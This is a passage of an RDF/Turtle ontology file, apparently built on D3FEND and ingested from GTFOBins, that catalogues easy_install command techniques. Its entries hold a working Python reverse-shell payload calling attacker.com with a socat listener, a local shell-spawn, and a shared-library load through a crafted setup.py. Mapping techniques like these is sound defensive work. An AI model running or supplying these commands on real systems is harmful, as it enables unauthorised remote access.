echo 'from ctypes import cdll; cdll.LoadLibrary("lib.so")' > $TF/setup.py
easy_install $TF
""" .

mknd:command_easy_install-reverse-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "easy_install-reverse-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell." ;
    d3f:uses mknd:executable_easy_install ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_easy_install ;
    mknd:provides mknd:function_reverse-shell ;
    mknd:value """export RHOST=attacker.com
export RPORT=12345
TF=$(mktemp -d)
echo 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")' > $TF/setup.py
easy_install $TF
""" .

mknd:command_easy_install-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "easy_install-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_easy_install ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_easy_install ;
    mknd:provides mknd:function_shell ;
    mknd:value """TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
easy_install $TF
""" .

